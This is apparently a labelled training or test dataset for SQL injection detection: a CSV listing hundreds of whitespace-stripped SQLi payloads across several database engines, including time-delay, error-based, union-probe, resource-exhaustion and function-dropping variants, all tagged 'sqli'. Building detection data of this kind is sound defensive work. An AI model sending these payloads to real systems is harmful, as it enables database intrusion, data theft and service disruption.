payload,attack_type,label
"1"")asktnqwhere9005=9005;selectbenchmark(5000000,md5(0x714e4153))#",sqli,1
"1')))or8384=like('abcdefg',upper(hex(randomblob(500000000/2))))and((('jueq'='jueq",sqli,1
"1')))unionallselectnull,null,null,null--",sqli,1
"1'+(select'sppw'where1677=1677andexp(~(select*from(selectconcat(0x7171706a71,(select(elt(8190=8190,1))),0x717a767a71,0x78))x)))+'",sqli,1
-8652')or4747=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4747=4747)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))),sqli,1
1;selectpg_sleep(5)--ojzt,sqli,1
"1""where4633=4633andchar(120)||char(106)||char(117)||char(85)=regexp_substring(repeat(right(char(9981),0),5000000000),null)--",sqli,1
"1%""unionallselectnull,null,null,null,null,null#",sqli,1
"1)))procedureanalyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)and(((1748=1748",sqli,1
"-2027%"")unionallselect2048,2048,2048,2048,2048,2048,2048,2048#",sqli,1
"1""))or4240=(select4240frompg_sleep(5))--",sqli,1
"1')orchar(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and('ozef'='ozef",sqli,1
"1"")and6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(6055=6055)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and(""rrbl""=""rrbl",sqli,1
"(selectlike('abcdefg',upper(hex(randomblob(500000000/2)))))",sqli,1
"-3633')where3513=3513unionallselect3513,3513,3513,3513,3513,3513,3513,3513,3513,3513#",sqli,1
1;select(casewhen(4666=4666)then1else4666*(select4666frommaster..sysdatabases)end)--,sqli,1
1'where8635=8635orderby1--,sqli,1
-6036)))or3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(3440=3440)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)and(((6723=6723,sqli,1
"1unionallselectnull,null,null,null,null,null,null,null,null,null#",sqli,1
1);selectsleep(5)and(4863=4863,sqli,1
-8860)or4144=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4144=4144)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual),sqli,1
"1""and(select*from(select(sleep(5)))gcrr)#",sqli,1
"-1048%""or3038=3038",sqli,1
"-2359'unionallselect2687,2687,2687#",sqli,1
1)aswshvwhere5684=5684;(select*from(select(sleep(5)))acdk)#,sqli,1
-4289'or2724in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(2724=2724)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and'agnc'like'agnc,sqli,1
1')asmqxbwhere6496=6496and7533=7533--,sqli,1
"-3219"")orderby1--",sqli,1
"1%');callregexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1
-6039%'))or6872=6872and(('%'=',sqli,1
"1')where4092=4092orchar(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1""))asriuiwhere2605=2605;selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3--",sqli,1
1'+(selecteluwwhere6210=6210;select(casewhen(6276=6276)then6276else6276*(select6276frominformation_schema.character_sets)end)#,sqli,1
"1%'orexp(~(select*from(selectconcat(0x7171706a71,(select(elt(6270=6270,1))),0x717a767a71,0x78))x))and'%'='",sqli,1
"1"")orchar(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and(""kzcd""=""kzcd",sqli,1
"1'and3707=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)",sqli,1
"-9774')))unionallselect6954,6954,6954#",sqli,1
"1'and8514=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)and'tfso'='tfso",sqli,1
1'||(select'ogyu'fromdualwhere6691=6691;select(casewhen(8820=4648)then8820else8820*(select8820frominformation_schema.character_sets)end)#,sqli,1
1'))asbswcwhere1635=1635and7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(7756=7756)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--,sqli,1
"1';selectbenchmark(5000000,md5(0x714e4153))#",sqli,1
-2817)where1212=1212or3266=1102,sqli,1
"-9574')asrxymwhere4719=4719unionallselect4719,4719,4719,4719,4719,4719,4719--",sqli,1
"1'))asylyqwhere2953=2953and2716=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
-8453)))or3038=3038,sqli,1
"1,(select(casewhen(9443=9443)thensleep(5)else9443*(select9443frominformation_schema.character_sets)end))",sqli,1
1')where6222=6222or(select*from(select(sleep(5)))ydpu)--,sqli,1
"1')))andexp(~(select*from(selectconcat(0x7171706a71,(select(elt(8190=8190,1))),0x717a767a71,0x78))x))and((('lyem'like'lyem",sqli,1
"1"")procedureanalyse(extractvalue(9255,concat(0x5c,(benchmark(5000000,md5(0x52515a50))))),1)and(""stcv""=""stcv",sqli,1
"1"")where5491=5491;beginuser_lock.sleep(5);end--",sqli,1
"-7412"")asqngtwhere2041=2041unionallselect2041--",sqli,1
"1%""and2716=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
"1""))asvbplwhere3885=3885and6969=(select6969frompg_sleep(5))--",sqli,1
"1where6100=6100and2716=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
"1""));if(9690=6491)select9690elsedropfunctionnyln--",sqli,1
"1%')or4915=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1%""))or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and((""%""=""",sqli,1
"1)or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)",sqli,1
"-3194"")))or4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4493=4493)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))and(((""erua""=""erua",sqli,1
"1"")andsleep(5)and(""ytof""=""ytof",sqli,1
1'where6913=6913and4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4386=4386)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1
"1where3737=3737or4915=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"1""or8315=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)and""kins""=""kins",sqli,1
"-8881%'unionallselect8420,8420,8420,8420,8420,8420,8420#",sqli,1
"1')))andupdatexml(3393,concat(0x2e,0x7171706a71,(select(elt(3393=3393,1))),0x717a767a71),1161)and((('gwew'like'gwew",sqli,1
"-9122)assdlgwhere1546=1546unionallselect1546,1546,1546,1546,1546,1546,1546--",sqli,1
"1""where5236=5236orchar(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null)--",sqli,1
"1""))and6510=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and((""vjvz""like""vjvz",sqli,1
"1"")orsleep(5)and(""fiag""like""fiag",sqli,1
"1',(select(casewhen(3717=3717)then1else3717*(select3717frommaster..sysdatabases)end))",sqli,1
"-2009%'unionallselect1991,1991#",sqli,1
"1"")where3507=3507;selectbenchmark(5000000,md5(0x4c4d6142))--",sqli,1
1')and2577=7094,sqli,1
1'and5835=6157and'bjee'like'bjee,sqli,1
"1%""));selectbenchmark(5000000,md5(0x714e4153))#",sqli,1
"-1975""unionallselect8638,8638,8638,8638,8638,8638,8638,8638,8638#",sqli,1
"1))asnxdfwhere1696=1696or8514=benchmark(5000000,md5(0x544d5a4c))#",sqli,1
"1%'unionallselectnull,null,null,null,null,null,null--",sqli,1
1'))asdqdvwhere8126=8126and4595=4595#,sqli,1
"1')where7093=7093and8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1""andmake_set(8262=3471,3471)and""wayp""=""wayp",sqli,1
"1""))orchar(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1%'))and8189=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"1'||(select'uyfo'where1236=1236or5286=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5))||'",sqli,1
-7565')or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq')and('gymz'='gymz,sqli,1
"1%"")and8024=3560--",sqli,1
"1%"")));if(7899=7899)select7899elsedropfunctionzbbp--",sqli,1
-2869'))unionallselect3216--,sqli,1
"1',(select(casewhen(1570=1570)then(select1570frompg_sleep(5))else1/(select0)end))",sqli,1
"1"")asbllzwhere6975=6975and8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1'inbooleanmode)or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)#",sqli,1
"1')))unionallselectnull,null,null,null,null,null--",sqli,1
-3895')or8645=5359--,sqli,1
"1%"")));callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
1)and7533=7533,sqli,1
"1%"")))orsleep(5)and(((""%""=""",sqli,1
1%'and2006=2006,sqli,1
1rlike(select(casewhen(7689=7689)then1else0x28end)),sqli,1
"1"")where4878=4878and(select*from(select(sleep(5)))fzno)--",sqli,1
"-6305"")))or8097=2048and(((""euyy""like""euyy",sqli,1
"1"")where9545=9545and9198=9198--",sqli,1
"1',extractvalue(9788,concat(0x5c,0x7171706a71,(select(elt(9788=9788,1))),0x717a767a71))",sqli,1
"1)))andupdatexml(3393,concat(0x2e,0x7171706a71,(select(elt(3393=3393,1))),0x717a767a71),1161)and(((5199=5199",sqli,1
-3125')))orderby1#,sqli,1
1'inbooleanmode);waitfordelay'0:0:5'#,sqli,1
"-5417orelt(1032=1032,3623)",sqli,1
"1))aszykvwhere2158=2158;selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5--",sqli,1
"1))asxvyiwhere6701=6701unionallselectnull,null,null,null#",sqli,1
"-7860')))unionallselect7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",sqli,1
1'||(select'lxyu'fromdualwhere5789=5789unionallselectnull#,sqli,1
"1')where3375=3375or8315=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)--",sqli,1
"1'where3028=3028;selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3--",sqli,1
"1'where7036=7036;callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1')asvmmkwhere5757=5757or9643=(selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3)--",sqli,1
"-1510')))unionallselect8755,8755,8755,8755,8755,8755,8755,8755,8755,8755--",sqli,1
"-7869%'unionallselect2406,2406,2406,2406,2406,2406,2406,2406#",sqli,1
"1%');createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)and('%'='",sqli,1
"1"")where8702=8702unionallselectnull,null,null,null,null--",sqli,1
"-4205')or1570=convert(int,(selectchar(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(1570=1570)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1
"1""));beginuser_lock.sleep(5);endand((""kvts""like""kvts",sqli,1
1'where6003=6003rlike(select(casewhen(7689=7689)then1else0x28end))--,sqli,1
1);waitfordelay'0:0:5'--,sqli,1
"-4400unionallselect3983,3983,3983,3983,3983,3983,3983,3983,3983,3983--",sqli,1
1'))and4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4386=4386)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))and(('jryo'='jryo,sqli,1
"-9958"")asjzvqwhere3741=3741unionallselect3741,3741,3741#",sqli,1
"-3952')unionallselect6644,6644,6644--",sqli,1
"1%""rlike(select*from(select(sleep(5)))vwyq)#",sqli,1
1'))and(select*from(select(sleep(5)))fzno)and(('wevl'='wevl,sqli,1
1));if(7899=7899)select7899elsedropfunctionzbbp--,sqli,1
"1%')))unionallselectnull,null,null,null,null,null,null,null,null#",sqli,1
"-4256')where9545=9545or5023=ctxsys.drithsx.sn(5023,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(5023=5023)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1
"-3393""))unionallselect5954,5954,5954,5954,5954,5954,5954,5954,5954,5954--",sqli,1
"1"")orchar(75)||char(70)||char(99)||char(83)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
1'where8482=8482orsleep(5)#,sqli,1
"1%';iif(5257=5257,1,1/0)",sqli,1
"1"")asypfawhere6128=6128;selectcount(*)fromdomain.domainsast1,domain.columnsast2,domain.tablesast3--",sqli,1
-3450'where4478=4478or9323=9323#,sqli,1
-8057'))asgpuewhere4205=4205or3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(3440=3440)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)--,sqli,1
"1')unionallselectnull,null,null,null,null,null,null,null,null,null--",sqli,1
"-5672%""or3825=9675--",sqli,1
1'or4240=(select4240frompg_sleep(5))--,sqli,1
"1"")))and4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4386=4386)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))and(((""msjh""like""msjh",sqli,1
"-2441'unionallselect1853,1853,1853,1853,1853,1853,1853--",sqli,1
1%'));select(casewhen(4006=1276)then1else4006*(select4006frommaster..sysdatabases)end)--,sqli,1
"1'||(select'nbmo'fromdualwhere5572=5572and8635=(selectcount(*)fromgenerate_series(1,5000000))--",sqli,1
"1"")and(3020=3020)*6703and(""hkjf""=""hkjf",sqli,1
"1')asoknwwhere8777=8777;iif(4836=1823,1,1/0)",sqli,1
"1')))orchar(117)||char(111)||char(105)||char(100)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and((('akyc'='akyc",sqli,1
(select(casewhen(3950=2747)then1else1/(select0)end)),sqli,1
1)where6039=6039and2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select(casewhen(2853=2853)then1else0end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113))asnumeric)--,sqli,1
"1')asssezwhere5351=5351orchar(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1
"1androw(6237,7469)>(selectcount(*),concat(0x7171706a71,(select(elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))xfrom(select5192unionselect3785unionselect3931unionselect7158)agroupbyx)#aetd",sqli,1
"1)where3915=3915unionallselectnull,null,null,null#",sqli,1
"-3979'inbooleanmode)unionallselect4911,4911,4911,4911,4911,4911,4911,4911,4911,4911#",sqli,1
"1)unionallselectnull,null,null,null,null,null,null,null--",sqli,1
"1'||(select'sned'where4957=4957and9254=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1')and6510=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)and('zpzf'='zpzf",sqli,1
1%'rlike(select*from(select(sleep(5)))sgvo)and'%'=',sqli,1
"1"")astnuxwhere4888=4888rlike(select*from(select(sleep(5)))vwyq)#",sqli,1
"1')asezoawhere4915=4915and9660=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
"1where8273=8273unionallselectnull,null,null,null,null,null,null,null#",sqli,1
"1));callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
"1"");selectlike('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"-1040where3058=3058unionallselect3058,3058,3058,3058,3058,3058,3058,3058,3058,3058--",sqli,1
1'orsleep(5)and'yudo'='yudo,sqli,1
"1'unionallselectnull,null,null,null#",sqli,1
"-2448%"")or3038=3038",sqli,1
"-5225'))aszatswhere5629=5629unionallselect5629,5629,5629,5629,5629--",sqli,1
"1'||(select'jzwq'where3289=3289unionallselectnull,null,null,null,null,null,null#",sqli,1
"-8477'unionallselect2517,2517,2517--",sqli,1
-7230')or2724in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(2724=2724)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and('khtc'='khtc,sqli,1
"1""and7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(7756=7756)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))and""qqfd""like""qqfd",sqli,1
"1')asznakwhere5203=5203;select*fromgenerate_series(4592,4592,casewhen(4592=4592)then1else0end)limit1--",sqli,1
"-4970')unionallselect4625,4625,4625,4625,4625,4625,4625,4625#",sqli,1
"1""andchar(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)",sqli,1
1)where4780=4780;begindbms_lock.sleep(5);end--,sqli,1
"1'))asqzypwhere5081=5081or2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1
1%'and(select*from(select(sleep(5)))fzno)and'%'=',sqli,1
"1')where9091=9091unionallselectnull,null,null,null#",sqli,1
"1)where6340=6340andexp(~(select*from(selectconcat(0x7171706a71,(select(elt(8190=8190,1))),0x717a767a71,0x78))x))--",sqli,1
"1%';iif(6369=5881,1,1/0)",sqli,1
1')))and3754=(selectupper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(3754=3754)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62)))fromdual)and((('mfmk'='mfmk,sqli,1
"1'qhfy<'"">utwq",sqli,1
"1%')))or5356=(selectcount(*)fromsysusersassys1,sysusersassys2,sysusersassys3,sysusersassys4,sysusersassys5,sysusersassys6,sysusersassys7)--",sqli,1
"1%"")));selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4--",sqli,1
"1'+(selectimmdwhere7499=7499unionallselectnull,null,null,null,null,null,null,null#",sqli,1
1and6240=('qqpjq'||(selectcase6240when6240then1else0endfromrdb$database)||'qzvzq'),sqli,1
"-9031%"")orderby1--",sqli,1
"1'or2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)and'ozur'='ozur",sqli,1
1')))and6969=(select6969frompg_sleep(5))and((('ineq'like'ineq,sqli,1
"1where7642=7642or2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)--",sqli,1
"-3007)where6648=6648unionallselect6648,6648,6648,6648,6648,6648,6648,6648#",sqli,1
"1%"";selectcasewhen7717=7717then1elsenullend--",sqli,1
1%')))and8594=(select8594frompg_sleep(5))--,sqli,1
"1""where2452=2452;selectsleep(5)#",sqli,1
-9327')or3038=3038,sqli,1
"-3035"")unionallselect7912,7912,7912#",sqli,1
"1'));selectbenchmark(5000000,md5(0x714e4153))#",sqli,1
1%'))or6793=(select6793frompg_sleep(5))and(('%'=',sqli,1
"1"";selectlike('abcdefg',upper(hex(randomblob(500000000/2))))and""kndm""=""kndm",sqli,1
1')))orderby1#,sqli,1
1where8966=8966;if(1087=5839)select1087elsedropfunctionzzeh--,sqli,1
"-7088'||(select'arol'fromdualwhere8891=8891unionallselect8891,8891,8891,8891,8891,8891,8891,8891#",sqli,1
"-2054%"")))or2724in((char(113)+char(113)+char(112)+char(106)+char(113)+(select(casewhen(2724=2724)thenchar(49)elsechar(48)end))+char(113)+char(122)+char(118)+char(122)+char(113)))and(((""%""=""",sqli,1
1'+(select'xqjx'where7048=7048and9198=9198--,sqli,1
"1"")));callregexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1
"1%';callregexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)and'%'='",sqli,1
"1'+(select'ggkm'where3394=3394;callregexp_substring(repeat(right(char(2385),0),500000000),null)--",sqli,1
1)asfhvbwhere4008=4008;beginuser_lock.sleep(5);end--,sqli,1
"1'))asanaqwhere9605=9605andelt(4249=4249,7259)--",sqli,1
"1')or7427=dbms_pipe.receive_message(chr(116)||chr(87)||chr(90)||chr(109),5)--",sqli,1
"1')))unionallselectnull,null,null,null#",sqli,1
1))and9198=9198--,sqli,1
"1%""and3202=like('abcdefg',upper(hex(randomblob(500000000/2))))and""%""=""",sqli,1
"1%"")))and9254=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1')or2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5)",sqli,1
"1"")where7957=7957and3202=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1%"")and2388=benchmark(5000000,md5(0x6d457153))#",sqli,1
"-6659')where1256=1256unionallselect1256,1256--",sqli,1
-2050'unionallselect5606#,sqli,1
"1%"");selectcasewhen7717=7717then1elsenullend--",sqli,1
1'inbooleanmode)or6793=(select6793frompg_sleep(5))#,sqli,1
"-8256"")))or6872=6872and(((""lrtu""=""lrtu",sqli,1
"1'||(select'mwmn'where5112=5112or(select9173from(selectcount(*),concat(0x7171706a71,(select(elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a))||'",sqli,1
"1"")));select(casewhen(4769=4769)then4769else4769*(select4769frommysql.db)end)#",sqli,1
"1)aswuiowhere5312=5312or7552=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
"1""))andchar(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1
"1"")orextractvalue(1297,concat(0x5c,0x7171706a71,(select(elt(1297=1297,1))),0x717a767a71))and(""cdnc""like""cdnc",sqli,1
"1"")));selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5and(((""khuw""like""khuw",sqli,1
"1%')unionallselectnull,null,null,null,null,null,null#",sqli,1
"1%')and6414=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)and('%'='",sqli,1
1'or6793=(select6793frompg_sleep(5))and'hokd'='hokd,sqli,1
"1""where1537=1537and(select9067from(selectcount(*),concat(0x7171706a71,(select(elt(9067=9067,1))),0x717a767a71,floor(rand(0)*2))xfrominformation_schema.character_setsgroupbyx)a)--",sqli,1
"1%"");begindbms_lock.sleep(5);end--",sqli,1
"1'||(select'ycya'fromdualwhere3536=3536and8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1
"1)asidvtwhere3490=3490and9660=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)--",sqli,1
1)))rlike(select*from(select(sleep(5)))sgvo)and(((4574=4574,sqli,1
"1"")))andchar(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1
1'))asvdhwwhere8858=8858orderby1#,sqli,1
"(select(casewhen(1938=1938)thendbms_pipe.receive_message(chr(118)||chr(118)||chr(112)||chr(76),5)else1938end)fromdual)",sqli,1
1'))or(select*from(select(sleep(5)))ydpu)and(('ytxg'='ytxg,sqli,1
"1"")andelt(4249=4249,7259)and(""xgka""like""xgka",sqli,1
1';select(casewhen(8642=6049)then1else8642*(select8642frommaster..sysdatabases)end)--,sqli,1
"-4012"")ormake_set(9354=9354,7185)and(""ccfn""=""ccfn",sqli,1
"1'or8315=(selectcount(*)fromsysibm.systablesast1,sysibm.systablesast2,sysibm.systablesast3)",sqli,1
1'where9242=9242;begindbms_lock.sleep(5);end--,sqli,1
"-4947'inbooleanmode)unionallselect3314,3314#",sqli,1
1')))and(3020=3020)*6703and((('qfxg'='qfxg,sqli,1
-1492where2788=2788unionallselect2788#,sqli,1
"1'unionallselectnull,null,null,null,null,null,null,null,null,null#",sqli,1
1'+(selectmfcdwhere6757=6757and4386=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select(casewhen(4386=4386)then1else0end)fromdual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))+',sqli,1
"-6363"")where4043=4043unionallselect4043,4043,4043,4043,4043,4043,4043,4043,4043--",sqli,1
"-5062"")))unionallselect4125,4125--",sqli,1
"-9451"")))unionallselect4211,4211,4211,4211,4211,4211,4211--",sqli,1
-7279)or9898=9963and(1481=1481,sqli,1
1))asoquiwhere3368=3368orderby1--,sqli,1
"1'where2025=2025and6414=(selectcount(*)fromrdb$fieldsast1,rdb$typesast2,rdb$collationsast3,rdb$functionsast4)--",sqli,1
1')))waitfordelay'0:0:5'--,sqli,1
1%')))or(select*from(select(sleep(5)))ydpu)and((('%'=',sqli,1
"1%""))orelt(5873=5873,sleep(5))#",sqli,1
"1'and5556=(selectcount(*)fromall_userst1,all_userst2,all_userst3,all_userst4,all_userst5)and'ccsb'='ccsb",sqli,1
"-1212%')ormake_set(7588=2306,2306)and('%'='",sqli,1
"1""where2394=2394and8831=8333--",sqli,1
"1'));selectcount(*)fromgenerate_series(1,5000000)and(('jloi'='jloi",sqli,1
1'||(select'bifa'where6077=6077and4547=9301,sqli,1
"1"")));createorreplacefunctionsleep(int)returnsintas'/lib/libc.so.6','sleep'language'c'strict;selectsleep(5)and(((""zlal""=""zlal",sqli,1
"1"")unionallselectnull,null,null,null,null,null,null,null,null,null--",sqli,1
1))asizvywhere2569=2569;beginuser_lock.sleep(5);end--,sqli,1
"1')asvpopwhere2528=2528unionallselectnull,null,null,null,null,null,null#",sqli,1
-7624')or5903=('qqpjq'||(selectcase5903when5903then1else0endfromrdb$database)||'qzvzq')and('iwab'='iwab,sqli,1
1)));select(casewhen(2830=7046)then2830elsecast(1asint)/(select0fromdual)end)fromdual--,sqli,1
"1%""))rlikesleep(5)and((""%""=""",sqli,1
"1%"")))unionallselectnull,null,null,null,null,null,null,null,null#",sqli,1
-8665'or6825=7840and'vbsy'like'vbsy,sqli,1
1'))askdsewhere6767=6767rlikesleep(5)#,sqli,1
"-3462))asbiylwhere5143=5143unionallselect5143,5143,5143--",sqli,1
1%'));(select*from(select(sleep(5)))acdk)#,sqli,1
